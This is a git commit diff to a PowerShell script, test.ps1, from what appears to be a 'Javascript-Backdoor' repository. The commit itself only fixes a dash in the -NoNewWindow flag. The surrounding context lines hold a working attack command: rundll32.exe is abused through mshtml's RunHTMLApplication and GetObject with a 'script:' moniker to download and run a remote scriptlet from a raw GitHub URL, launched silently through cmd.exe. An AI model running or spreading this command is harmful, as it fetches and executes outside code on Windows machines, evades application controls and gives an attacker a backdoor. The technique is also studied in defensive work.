c7bcb894a5feadf0dcf2eecc615a88a69d7f0561
3gstudent@3gstudent <robertpetersen@outlook.com>
2016-05-30 19:49:36 -0700

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,4 +1,4 @@
 $a="rundll32.exe javascript:`"\..\mshtml,RunHTMLApplication `";document.write();GetObject(`"script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test`")"
 $msexe="cmd.exe"
 $arguments="/c $a"
-start-process $msexe $arguments –NoNewWindow
+start-process $msexe $arguments -NoNewWindow
